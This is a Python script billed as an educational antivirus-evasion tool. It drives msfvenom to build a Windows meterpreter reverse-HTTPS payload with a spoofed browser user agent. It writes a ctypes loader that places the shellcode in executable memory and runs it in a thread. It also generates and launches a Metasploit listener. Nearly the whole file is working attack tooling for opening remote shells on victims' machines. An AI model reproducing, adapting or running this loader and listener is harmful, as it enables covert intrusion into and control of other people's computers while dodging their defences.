# ===============================================================
#   AVFIRE — Educational AV Evasion & Detection Research Tool
#   Powered by the GhostForge Engine
#   Author : ACW360
# ===============================================================

banner = """
\033[91m   ____ _               _     _____                      
  / ___| |__   ___  ___| |_  |  ___|__  _ __ __ _ _ __  
 | |  _| '_ \ / _ \/ __| __| | |_ / _ \| '__/ _` | '_ \ 
 | |_| | | | |  __/\__ \ |_  |  _| (_) | | | (_| | | | |
  \____|_| |_|\___||___/\__| |_|  \___/|_|  \__,_|_| |_|
\033[96m -------------------------------------------------------------
             GhostForge Engine  |  Developer: ACW360
 -------------------------------------------------------------
\033[0m
"""

print(banner)


import subprocess
import os

def generate_payload():
    print("\n=== PAYLOAD GENERATOR ===")
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    outfile = input("Enter output Python filename (e.g. loader.py): ")

    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter_reverse_https",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "LURI=/api/v1/data/",
        'HTTPUSERAGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76',
        "-f", "python"
    ]

    print("\n[+] Generating shellcode using msfvenom...\n")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print("ERROR running msfvenom:")
        print(result.stderr)
        return

    shellcode = result.stdout.strip()

    template = f"""
import ctypes
import threading
from ctypes import wintypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

{shellcode}

# Define functions from kernerl32.dll
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(current_process, sc_memory, ctypes.c_char_p(buf), len(buf), ctypes.byref(bytes_written))
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()
    return 1

def Run():
    thread = threading.Thread(target=ThreadFunction, args=(None,))
    thread.start()

if __name__ == "__main__":
    Run()
    """

    with open(outfile, "w") as f:
        f.write(template)

    print(f"\n[+] Payload generated and saved as: {outfile}\n")


def start_listener():
    print("\n=== START LISTENER ===")
    
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT: ")

    print("\n[+] Starting Metasploit listener...\n")

    rc_content = f"""
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST {lhost}
set LPORT {lport}
set LURI /api/v1/data/
exploit -j
"""

    # Save temporary RC file
    with open("listener.rc", "w") as f:
        f.write(rc_content)

    # Start msfconsole with handler
    os.system("msfconsole -r listener.rc")


def main_menu():
    while True:
        print("\n========================")
        print("   PAYLOAD MENU v1.0")
        print("========================")
        print("1) Generate Payload")
        print("2) Start Listener")
        print("3) Exit")
        print("========================")

        choice = input("Enter choice: ")

        if choice == "1":
            generate_payload()
        elif choice == "2":
            start_listener()
        elif choice == "3":
            print("Goodbye!")
            break
        else:
            print("Invalid choice, try again.\n")


if __name__ == "__main__":
    main_menu()
